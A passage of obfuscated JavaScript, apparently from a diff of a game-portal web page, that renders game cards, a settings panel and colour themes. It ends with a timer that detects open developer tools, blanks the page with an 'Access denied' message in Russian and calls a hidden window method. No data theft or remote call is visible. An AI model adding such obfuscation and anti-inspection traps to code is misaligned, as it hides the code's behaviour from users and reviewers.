_0x547e14=_0x53bd4a,_0x3e8705=document[_0x547e14(0x19c)](_0x547e14(0x1ef));_0x3e8705[_0x547e14(0x164)]='game-card',_0x3e8705[_0x547e14(0x1e9)][_0x547e14(0x1d3)]=_0x3b6f5a*0.1+'s',_0x3e8705[_0x547e14(0x202)]=_0x547e14(0x1df)+_0x5e5a55['image']+_0x547e14(0x174)+_0x5e5a55['name']+_0x547e14(0x153)+_0x5e5a55[_0x547e14(0x1f3)]+_0x547e14(0x1c8)+(translations[_0x547e14(0x212)][_0x278fb0]||translations[_0x547e14(0x212)]['ru'])+_0x547e14(0x1e4),_0x33f4ad[_0x547e14(0x171)](_0x3e8705);});}function setupSettingsPanel(){const _0x402160=_0x449f1d,_0x51654b=document[_0x402160(0x17e)](_0x402160(0x1ff)),_0x507332=document[_0x402160(0x17e)](_0x402160(0x1af)),_0x3925fe=document[_0x402160(0x179)](_0x402160(0x1ed)),_0x4386d7=document['querySelectorAll'](_0x402160(0x1b5)),_0x3b780c=document[_0x402160(0x179)](_0x402160(0x1a0)),_0x5caf24=document['querySelectorAll'](_0x402160(0x1cc));_0x507332[_0x402160(0x1e9)][_0x402160(0x1bf)]=_0x402160(0x167),_0x3925fe[_0x402160(0x1ce)](_0x3b25b9=>{const _0x289217=_0x402160;_0x3b25b9[_0x289217(0x1f5)]('click',_0x481a17=>{const _0xa5e854=_0x289217;_0x481a17[_0xa5e854(0x1d9)](),_0x3925fe[_0xa5e854(0x1ce)](_0x2c1be6=>_0x2c1be6['classList'][_0xa5e854(0x1b4)](_0xa5e854(0x1e3))),_0x3b25b9[_0xa5e854(0x18c)][_0xa5e854(0x193)](_0xa5e854(0x1e3));const _0x47fa7b=_0x3b25b9['getAttribute']('data-tab');_0x4386d7[_0xa5e854(0x1ce)](_0x1303d6=>{const _0x57ad5a=_0xa5e854;_0x1303d6[_0x57ad5a(0x18c)][_0x57ad5a(0x1b4)]('active'),_0x1303d6['id']===_0x47fa7b+_0x57ad5a(0x163)&&_0x1303d6[_0x57ad5a(0x18c)][_0x57ad5a(0x193)](_0x57ad5a(0x1e3));});});}),_0x51654b['addEventListener'](_0x402160(0x1f7),function(_0x5b48ee){const _0x47418b=_0x402160;_0x5b48ee[_0x47418b(0x1d9)](),_0x507332[_0x47418b(0x1e9)]['display']=_0x507332[_0x47418b(0x1e9)][_0x47418b(0x1bf)]===_0x47418b(0x162)?_0x47418b(0x167):'block';}),document['addEventListener']('click',function(_0x21d257){const _0x170ca7=_0x402160;!_0x507332[_0x170ca7(0x1bd)](_0x21d257[_0x170ca7(0x199)])&&_0x21d257[_0x170ca7(0x199)]!==_0x51654b&&(_0x507332[_0x170ca7(0x1e9)][_0x170ca7(0x1bf)]=_0x170ca7(0x167));}),_0x3b780c['forEach'](_0x58107e=>{_0x58107e['addEventListener']('click',_0x22d4da=>{const _0x52b0bc=_0xbe20;_0x22d4da['stopPropagation'](),_0x3b780c[_0x52b0bc(0x1ce)](_0x219fad=>_0x219fad[_0x52b0bc(0x18c)][_0x52b0bc(0x1b4)](_0x52b0bc(0x1e3))),_0x58107e['classList']['add'](_0x52b0bc(0x1e3));const _0x266f80=_0x58107e[_0x52b0bc(0x1d7)]('data-theme');applyTheme(_0x266f80);});}),_0x5caf24[_0x402160(0x1ce)](_0x375013=>{const _0x1fc49e=_0x402160;_0x375013['addEventListener'](_0x1fc49e(0x1f7),_0x1c5a02=>{const _0x13a6fc=_0x1fc49e;_0x1c5a02[_0x13a6fc(0x1d9)](),_0x5caf24[_0x13a6fc(0x1ce)](_0x4c0921=>_0x4c0921[_0x13a6fc(0x18c)][_0x13a6fc(0x1b4)](_0x13a6fc(0x1e3))),_0x375013[_0x13a6fc(0x18c)][_0x13a6fc(0x193)](_0x13a6fc(0x1e3));const _0x5553c7=_0x375013['getAttribute'](_0x13a6fc(0x183));populateGames(_0x5553c7);});});}function applyTheme(_0x123862){const _0x4a4ab9=_0x449f1d,_0x2584f2=document[_0x4a4ab9(0x215)];switch(_0x123862){case'sunset':_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x201),_0x4a4ab9(0x1a6)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x1a3),_0x4a4ab9(0x166)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x188),'linear-gradient(-45deg,\x20#121212,\x20#1a1a1a,\x20#222222)'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--btn-glow',_0x4a4ab9(0x1a8)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x200),_0x4a4ab9(0x1a6)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1a9),_0x4a4ab9(0x166)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--logo-bg',_0x4a4ab9(0x1c4)),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--logo-border',_0x4a4ab9(0x17f)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16b),_0x4a4ab9(0x1c4)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1e2),_0x4a4ab9(0x16c)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),_0x4a4ab9(0x1c4)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x20d),'#ffffff');break;case _0x4a4ab9(0x18d):_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--primary-color',_0x4a4ab9(0x1fc)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1a3),_0x4a4ab9(0x1a1)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x188),_0x4a4ab9(0x1d2)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x173),_0x4a4ab9(0x203)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x200),_0x4a4ab9(0x1fc)),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--logo-text-color-2','#8E54E9'),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x16e),_0x4a4ab9(0x1c4)),_0x2584f2['style']['setProperty']('--logo-border','rgba(255,255,255,0.2)'),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16b),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--card-hover',_0x4a4ab9(0x16c)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),'#1a1a1a'),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x20d),_0x4a4ab9(0x17a));break;case _0x4a4ab9(0x185):_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--primary-color',_0x4a4ab9(0x21c)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1a3),'#2c5364'),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x188),'linear-gradient(-45deg,\x20#0a0a0a,\x20#121212,\x20#1a1a1a)'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--btn-glow',_0x4a4ab9(0x1c7)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x200),'#88d3ce'),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1a9),_0x4a4ab9(0x205)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16e),'#1a1a1a'),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x16d),_0x4a4ab9(0x1b9)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16b),'#1a1a1a'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--card-hover',_0x4a4ab9(0x16c)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x20d),_0x4a4ab9(0x17a));break;case _0x4a4ab9(0x20c):_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x201),_0x4a4ab9(0x1ac)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--secondary-color',_0x4a4ab9(0x1f9)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--bg-gradient',_0x4a4ab9(0x1d2)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x173),_0x4a4ab9(0x1a5)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--logo-text-color-1',_0x4a4ab9(0x1ac)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--logo-text-color-2',_0x4a4ab9(0x1f9)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16e),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16d),'rgba(255,255,255,0.2)'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16b),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1e2),_0x4a4ab9(0x16c)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty']('--text-color',_0x4a4ab9(0x17a));break;case _0x4a4ab9(0x17b):_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x201),_0x4a4ab9(0x187)),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--secondary-color','#FF4B2B'),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x188),'linear-gradient(-45deg,\x20#0a0a0a,\x20#121212,\x20#1a1a1a)'),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x173),_0x4a4ab9(0x1ad)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x200),_0x4a4ab9(0x187)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x1a9),_0x4a4ab9(0x15d)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16e),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16d),_0x4a4ab9(0x17f)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--card-bg','#1a1a1a'),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1e2),_0x4a4ab9(0x16c)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--text-color','#ffffff');break;case _0x4a4ab9(0x15e):_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x201),_0x4a4ab9(0x1b2)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--secondary-color','#516395'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--bg-gradient',_0x4a4ab9(0x1d2)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--btn-glow',_0x4a4ab9(0x180)),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--logo-text-color-1',_0x4a4ab9(0x1b2)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1a9),_0x4a4ab9(0x16a)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x16e),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16d),_0x4a4ab9(0x17f)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16b),'#1a1a1a'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1e2),'#2a2a2a'),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty']('--text-color',_0x4a4ab9(0x17a));break;case'green':_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x201),'#11998e'),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x1a3),'#38ef7d'),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x188),_0x4a4ab9(0x1d2)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x173),_0x4a4ab9(0x210)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty']('--logo-text-color-1','#11998e'),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty']('--logo-text-color-2',_0x4a4ab9(0x21e)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16e),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16d),_0x4a4ab9(0x17f)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16b),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty']('--card-hover',_0x4a4ab9(0x16c)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x20d),_0x4a4ab9(0x17a));break;case _0x4a4ab9(0x1dc):_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--primary-color',_0x4a4ab9(0x1ec)),_0x2584f2['style']['setProperty']('--secondary-color',_0x4a4ab9(0x1f2)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x188),_0x4a4ab9(0x1d2)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x173),'0\x200\x2015px\x20rgba(69,\x20104,\x20220,\x200.7)'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--logo-text-color-1',_0x4a4ab9(0x1ec)),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--logo-text-color-2','#B06AB3'),_0x2584f2['style']['setProperty'](_0x4a4ab9(0x16e),'#1a1a1a'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16d),'rgba(255,255,255,0.2)'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16b),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x1e2),'#2a2a2a'),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--settings-bg',_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x20d),'#ffffff');break;default:_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x201),_0x4a4ab9(0x205)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--secondary-color',_0x4a4ab9(0x1b3)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty']('--bg-gradient','linear-gradient(-45deg,\x20#0a0a0a,\x20#121212,\x20#1a1a1a)'),_0x2584f2['style']['setProperty'](_0x4a4ab9(0x173),_0x4a4ab9(0x1d1)),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--logo-text-color-1',_0x4a4ab9(0x205)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--logo-text-color-2',_0x4a4ab9(0x1b3)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x16e),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)]['setProperty'](_0x4a4ab9(0x16d),_0x4a4ab9(0x17f)),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--card-bg','#1a1a1a'),_0x2584f2['style'][_0x4a4ab9(0x1f8)]('--card-hover',_0x4a4ab9(0x16c)),_0x2584f2['style'][_0x4a4ab9(0x1f8)](_0x4a4ab9(0x1ab),_0x4a4ab9(0x1c4)),_0x2584f2[_0x4a4ab9(0x1e9)][_0x4a4ab9(0x1f8)]('--text-color',_0x4a4ab9(0x17a));}}document[_0x449f1d(0x1f5)](_0x449f1d(0x1b1),()=>{createStars(),createParticles(),populateGames(),setupSettingsPanel(),setInterval(()=>{const _0x25c619=_0xbe20;(window[_0x25c619(0x157)]-window[_0x25c619(0x1ae)]>0x64||window['outerWidth']-window[_0x25c619(0x194)]>0x64)&&(document[_0x25c619(0x1bb)][_0x25c619(0x202)]='<h1\x20style=\x22color:red;text-align:center;margin-top:50px;\x22>Доступ\x20запрещен</h1>',window[_0x25c619(0x1a2)]());},0x3e8);});
+    </script>
+</body>
+</html>
